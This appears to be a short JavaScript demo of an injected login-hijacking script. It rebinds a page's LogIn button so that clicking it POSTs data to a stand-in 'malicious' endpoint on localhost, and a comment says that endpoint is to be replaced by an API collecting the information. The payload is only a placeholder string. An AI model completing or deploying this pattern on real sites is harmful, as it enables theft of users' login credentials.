
// Inject Man In the Middle Script
function injectManInTheMiddleScript() {
    console.log("Silently Listen");
    var textHtml = document.getElementById("demo").innerHTML 
    document.getElementById("demo").innerHTML = textHtml.substring(0,textHtml.indexOf('you have Big Bonanza Offer'));
    document.getElementById("LogIn").onclick = function() {
        listingFunction();
        myFunction();
    }
}


// Function Performing the Man In the Middle 
function listingFunction() {
    console.log("I am listening the confidential details");
    // 
    var xhttp = new XMLHttpRequest();
    xhttp.onreadystatechange = function() {
         if (this.readyState == 4 && this.status == 200) {
             alert(this.responseText);
         }
    };
    // Same Host will give CORS error
    // malicious.html = Will be replaced by the API listening to the information
    xhttp.open("POST", "http://localhost:3000/malicious.html", true);
    xhttp.setRequestHeader("Content-type", "application/json");
    xhttp.send("Your JSON Data Here");
    return false;
}